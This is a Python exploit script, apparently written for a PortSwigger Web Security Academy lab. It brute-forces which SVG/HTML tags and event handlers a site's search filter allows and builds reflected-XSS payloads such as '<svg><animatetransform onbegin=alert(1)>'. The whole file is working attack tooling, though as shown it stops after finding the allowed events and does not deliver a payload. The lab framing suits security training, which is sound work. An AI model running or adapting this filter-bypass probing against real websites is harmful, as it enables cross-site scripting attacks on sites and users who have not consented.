#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Script: Reflected XSS with customizable SVG tag combination

This script targets a PortSwigger Web Security Academy lab scenario where only certain SVG tags
are whitelisted, and event handlers are selectively permitted. The user can define a combination
of allowed SVG tags and events.

Steps:
  1. Input LAB_URL via user input.
  2. Optionally configure Burp Proxy.
  3. User inputs the wordlist file for allowed tags.
  4. Brute-force allowed tags using the user-provided wordlist.
  5. User selects and combines tags.
  6. User inputs the wordlist file for allowed events.
  7. Brute-force allowed events.
  8. User selects an allowed event.
  9. Deliver the payload.
"""

import requests
from colorama import init, Fore, Style
import urllib.parse
import urllib3

# Initialize colorama for colored terminal output
init(autoreset=True)

# Disable SSL warnings for Burp Proxy interception
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_lab_url_and_proxy():
    """
    Prompt the user to enter the lab URL and proxy settings if needed.
    """
    lab_url = input(f"{Fore.CYAN}Enter the LAB URL (e.g., https://YOUR-LAB-ID.web-security-academy.net): {Style.RESET_ALL}").strip()

    use_proxy = input(f"{Fore.MAGENTA}Do you want to use a Burp Proxy? (y/n): {Style.RESET_ALL}").strip().lower()
    if use_proxy == 'y':
        proxy_host = input(f"{Fore.CYAN}Enter proxy host (default: 127.0.0.1): {Style.RESET_ALL}").strip() or "127.0.0.1"
        proxy_port = input(f"{Fore.CYAN}Enter proxy port (default: 8080): {Style.RESET_ALL}").strip() or "8080"
        proxy_url = f"http://{proxy_host}:{proxy_port}"
        burp_proxy = {"http": proxy_url, "https": proxy_url}
        print(f"{Fore.GREEN}[+] Proxy set to: {proxy_url}{Style.RESET_ALL}")
    else:
        burp_proxy = None
        print(f"{Fore.YELLOW}[!] No proxy will be used.{Style.RESET_ALL}")

    return lab_url, burp_proxy

def brute_force_tags(lab_url, burp_proxy):
    """
    Brute-force tags using user-provided wordlist and identify allowed tags.
    """
    allowed_tags = []
    wordlist_file = input(f"{Fore.CYAN}Enter the tag wordlist file path: {Style.RESET_ALL}").strip()
    try:
        with open(wordlist_file, 'r') as f:
            tags = f.read().splitlines()

        print(f"{Fore.YELLOW}[*] Starting tag brute force...{Style.RESET_ALL}")
        for tag in tags:
            payload = f"<{tag}>"
            encoded_payload = urllib.parse.quote(payload)
            url = f"{lab_url}/?search={encoded_payload}"
            response = requests.get(url, verify=False, proxies=burp_proxy)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Allowed tag found: <{tag}>{Style.RESET_ALL}")
                allowed_tags.append(tag)

    except FileNotFoundError:
        print(f"{Fore.RED}[!] Wordlist file not found!{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")

    return allowed_tags

def brute_force_events(lab_url, burp_proxy, allowed_tags):
    """
    Brute-force events using user-provided event wordlist and identify allowed events.
    """
    allowed_events = []
    event_wordlist = input(f"{Fore.CYAN}Enter the event wordlist file path: {Style.RESET_ALL}").strip()
    try:
        with open(event_wordlist, 'r') as f:
            events = f.read().splitlines()

        print(f"{Fore.YELLOW}[!] Enter the EVENT TO USE TAG. Tag structure step-by-step(<tag><tag><EVENT_TO_USE_TAG §event§=alert(1)>). Allowed tags: {', '.join(allowed_tags)}{Style.RESET_ALL}")
        event_tag = input(f"{Fore.CYAN}Enter tag name (e.g., animatetransform) or press Enter to skip: {Style.RESET_ALL}").strip()
        
        tag_structure = ""
        print(f"{Fore.YELLOW}[!] Enter the TAG structure step-by-step(<TAG><TAG><{event_tag} §event§=alert(1)>). Allowed tags: {', '.join(allowed_tags)}{Style.RESET_ALL}")

        while True:
            tag = input(f"{Fore.CYAN}Enter tag name (e.g., svg) or press Enter to stop: {Style.RESET_ALL}").strip()
            if not tag:
                print(f"{Fore.YELLOW}[*] Starting tag brute force...{Style.RESET_ALL}")
                break
            if tag not in allowed_tags:
                print(f"{Fore.RED}[!] Invalid tag. Please choose from the allowed tags.{Style.RESET_ALL}")
            else:
                tag_structure += f"<{tag}>"

        if not tag_structure:
            print(f"{Fore.RED}[!] No tags selected. Exiting...{Style.RESET_ALL}")
            return []

        print(f"{Fore.YELLOW}[*] payload:{tag_structure}<{event_tag} §event§=alert(1)>. Starting event brute force...{Style.RESET_ALL}")
        for event in events:
            payload = f"{tag_structure}<{event_tag} {event}=alert(1)>"
            encoded_payload = urllib.parse.quote(payload)
            url = f"{lab_url}/?search={encoded_payload}"
            response = requests.get(url, verify=False, proxies=burp_proxy)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Allowed event found: {event}{Style.RESET_ALL}")
                allowed_events.append(event)

    except FileNotFoundError:
        print(f"{Fore.RED}[!] Event wordlist file not found!{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")

    return allowed_events

def main():
    print(f"{Fore.CYAN}=== Reflected XSS Exploit Script ==={Style.RESET_ALL}")

    # Step 1: Get lab URL and optional proxy settings
    lab_url, burp_proxy = get_lab_url_and_proxy()

    # Step 2: Brute-force allowed tags
    allowed_tags = brute_force_tags(lab_url, burp_proxy)

    if not allowed_tags:
        print(f"{Fore.RED}[!] No allowed tags found. Exiting...{Style.RESET_ALL}")
        return

    # Step 3: Brute-force allowed events
    allowed_events = brute_force_events(lab_url, burp_proxy, allowed_tags)

    if not allowed_events:
        print(f"{Fore.RED}[!] No allowed events found. Exiting...{Style.RESET_ALL}")
        return

if __name__ == "__main__":
    main()